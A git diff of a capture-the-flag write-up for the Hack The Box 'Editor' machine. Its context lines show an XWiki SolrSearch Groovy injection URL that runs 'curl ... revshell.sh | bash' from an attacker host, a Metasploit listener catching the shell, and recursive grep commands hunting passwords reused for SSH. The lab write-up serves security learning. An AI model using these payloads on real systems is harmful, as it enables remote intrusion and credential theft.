@@ -1,5 +1,5 @@
 ---
-{"publish":true,"created":"2025-08-16T10:15:21.901+05:30","modified":"2025-08-31T09:42:04.337+05:30","published":"2025-08-31T09:42:04.337+05:30","tags":["easy","enum","CVE"],"cssclasses":"","api":"https://www.hackthebox.com/api/v4/user/achievement/machine/1454964/684"}
+{"publish":true,"created":"2025-08-16T10:15:21.901+05:30","modified":"2025-12-25T11:54:54.290+05:30","published":"2025-12-25T11:54:54.290+05:30","tags":["easy","enum","CVE"],"cssclasses":"","api":"https://www.hackthebox.com/api/v4/user/achievement/machine/1454964/684"}
 ---
 
 ## Initial Access
@@ -176,13 +176,17 @@ def exploit(target_url):
 
 This was the payload we used before URL-encoding to get a reverse shell: `["/bin/sh","-c","curl http://10.10.16.8/revshell.sh | bash"]`
 
-revshell.sh
+`revshell.sh` being the reverse shell payload. Obviously for the target to fetch our payload, we will have to start a python web server that hosts it.
 
 `python3 -m http.server`
+
+Here is `exploit_url` before and after changes:
 
 `exploit_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%5B%22%2Fbin%2Fsh%22%2C%22-c%22%2C%22curl%20http%3A%2F%2F{host}%2Frevshell.sh%20%7C%20bash%22%5D.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"`
 
 `exploit_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%5B%22%2Fbin%2Fsh%22%2C%22-c%22%2C%22curl%20http%3A%2F%2F10.10.16.8%2Frevshell.sh%20%7C%20bash%22%5D.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"`
+
+We will start a listener, and run our exploit.
 
 ```
 msf6 exploit(multi/handler) > exploit
@@ -198,12 +202,22 @@ $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 xwiki@editor:/usr/lib/xwiki-jetty$
 ```
 
+We now have initial access.
+
+## Lateral Movement
+
+The following command is a regex way to find passwords. However it might not work everywhere, and must be often manually found.
+
 `grep -inrE "(?i)\bpassword[\s:]*([A-Za-z0-9]+)" / 2> /dev/null`
+
+Moving on...
 
 ```shell
 $ pwd 
 /usr/lib/xwiki/WEB-INF
 ```
+
+This is the current directory in which I'm about to look for passwords.
 
 ```shell
 $ cat * | grep -i "password"
@@ -221,7 +235,11 @@ cat: observation: Is a directory
     <property name="hibernate.connection.password"></property>
 ```
 
-`ssh oliver@editor.htb`
+There's the password! We can now ssh into oliver's account.
+
+```
+ssh oliver@editor.htb
+```
 
 ## Privilege Escalation
 
